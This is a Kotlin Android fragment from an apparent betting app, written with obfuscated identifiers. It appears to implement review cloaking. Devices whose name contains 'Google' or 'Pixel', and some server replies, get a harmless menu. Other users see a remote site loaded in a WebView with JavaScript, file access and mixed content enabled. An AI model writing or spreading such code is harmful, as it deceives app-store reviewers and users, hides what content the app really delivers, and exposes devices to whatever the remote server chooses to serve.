package com.blaze.aposta.blazebet
import android.os.Build
import android.os.Bundle
import android.text.TextUtils
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.WebViewClient
import androidx.core.view.isVisible

import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.blaze.aposta.blazebet.databinding.KsldcklsdjckldsjckBinding

import kotlinx.coroutines.*
import okhttp3.*
import java.io.IOException




class sskldjcklds : Fragment() {
    val dsjkhdsjkASD by lazy { KsldcklsdjckldsjckBinding.inflate(layoutInflater) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

    }
    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {




        CoroutineScope(Dispatchers.IO).launch {
            val okHttpClient = OkHttpClient()
            try {
            }catch (e:Exception){

            }
            val requestOkHttp = Request.Builder()

                .url("https://moshka.site/")
                .build()


            okHttpClient.newCall(requestOkHttp).enqueue(object : Callback {
                override fun onFailure(dsljkhdsklASD: Call, e: IOException) {
                    e.printStackTrace()

                    CoroutineScope(Dispatchers.Main).launch {
                        findNavController().navigate(R.id.action_sskldjcklds_to_menuFragment)
                    }
                }

                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        if (!response.isSuccessful) {
                            CoroutineScope(Dispatchers.Main).launch {

                                findNavController().navigate(R.id.action_sskldjcklds_to_menuFragment)
                            }
                            throw IOException("З" +
                                    " ${response.code} ${response.message}")

                        }


                        if (ksdjlkdsj.ksdjklsdjklds()!!.contains("Google Pixel", ignoreCase = true)
                            or ksdjlkdsj.ksdjklsdjklds()!!.contains("Pixel", ignoreCase = true)
                            or ksdjlkdsj.ksdjklsdjklds()!!.contains("Google", ignoreCase = true)
                        ) {
                            CoroutineScope(Dispatchers.Main).launch {
                                Log.d("dddddddddddd","2")

                                findNavController().navigate(R.id.action_sskldjcklds_to_menuFragment)
                            }
                        } else {

                            var i = response.body!!.string()
                            Log.d("asasas",i)
                            if(i == "moshka"){

                                CoroutineScope(Dispatchers.Main).launch {
                                    findNavController().navigate(R.id.action_sskldjcklds_to_menuFragment)
                                }
                            }else {


                                CoroutineScope(Dispatchers.Main).launch {
                                    dsjkhdsjkASD.kdsljkdlsasd.isVisible = false
                                    with(dsjkhdsjkASD.ksljdklsasd) {
                                        settings.setLoadsImagesAutomatically(true)
                                        webViewClient = WebViewClient()
                                        settings.allowFileAccess = true
                                        settings.mixedContentMode = 0
                                        settings.javaScriptEnabled = true
                                        settings.javaScriptCanOpenWindowsAutomatically = true
                                        settings.javaScriptEnabled = true
                                        settings.domStorageEnabled = true
                                     //   (requireContext() as MainActivity) .goBack = {goBack()}
                                        loadUrl("https://moshka.site/")
                                    }
                                }}}
                    }
                }
                //   }
            })}

        return dsjkhdsjkASD.root

    }
}

class ksdjlkdsj {
    companion object {
        fun ksdjklsdjklds(): String? {


            val kljsdkljds = Build.MANUFACTURER
            val kdsjkldsj = Build.MODEL
            return if (kdsjkldsj.startsWith(kljsdkljds)) {

                slkdjsdkjds(kdsjkldsj)
            } else slkdjsdkjds(kljsdkljds) + " " + kdsjkldsj
        }

        private fun slkdjsdkjds(ksdjkldsj: String): String {
            if (TextUtils.isEmpty(ksdjkldsj)) {

                return ksdjkldsj
            }
            val kldsjkldj = ksdjkldsj.toCharArray()
            var ksdjksdj = true



            val klsjckldjsklcjsdlk = StringBuilder()
            for (kldsjkldsjkldsjkldsjlsd in kldsjkldj) {
                if (ksdjksdj && Character.isLetter(kldsjkldsjkldsjkldsjlsd)) {
                    klsjckldjsklcjsdlk.append(kldsjkldsjkldsjkldsjlsd.uppercaseChar())
                    ksdjksdj = false
                    continue
                } else if (Character.isWhitespace(kldsjkldsjkldsjkldsjlsd)) {
                    ksdjksdj = true
                }
                klsjckldjsklcjsdlk.append(kldsjkldsjkldsjkldsjlsd)
            }
            return klsjckldjsklcjsdlk.toString()
        }
    }

}
